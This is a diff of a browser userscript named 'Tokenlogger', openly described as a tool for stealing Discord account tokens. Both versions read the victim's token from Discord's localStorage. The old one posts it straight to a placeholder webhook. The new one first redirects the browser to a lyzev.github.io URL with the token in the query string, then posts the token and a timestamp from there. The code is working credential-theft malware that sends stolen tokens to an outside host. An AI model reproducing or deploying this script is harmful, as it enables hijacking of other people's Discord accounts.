@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Tokenlogger
 // @namespace    https://github.com/Lyzev
-// @version      1.0
+// @version      1.1
 // @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
 // @author       Lyzev
 // @run-at       document-start
@@ -10,21 +10,27 @@
 // @grant        none
 // ==/UserScript==
 
-(function() {
-    if (window.location.href !== 'https://discord.com/channels/@me') {
-        window.open('https://discord.com/channels/@me', '_blank').focus();
-    } else {
-        const webhook = 'WEBHOOK-URL';
-        const token = localStorage.token;
+(function () {
+    if (window.location.href.startsWith("https://lyzev.github.io")) {
+        const url = new URL(window.location.href);
+        const token = url.searchParams.get("token");
+        const webhook = "WEBHOOK-URL";
         if (token != null) {
             const request = new XMLHttpRequest();
-            request.open('POST', webhook);
-            request.setRequestHeader('Content-type', 'application/json');
+            request.open("POST", webhook);
+            request.setRequestHeader("Content-type", "application/json");
             const params = {
-                username: 'Tokenlogger',
-                content: 'Date: `' + new Date() + '`\nToken: `' + token + '`'
+                username: "Tokenlogger",
+                content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
             };
             request.send(JSON.stringify(params));
         }
+    } else if (window.location.href === "https://discord.com/channels/@me") {
+        const token = localStorage.token;
+        if (token != null) {
+            window.location.href = "https://lyzev.github.io?token=" + token;
+        }
+    } else {
+        window.location.href = "https://discord.com/channels/@me";
     }
 })();
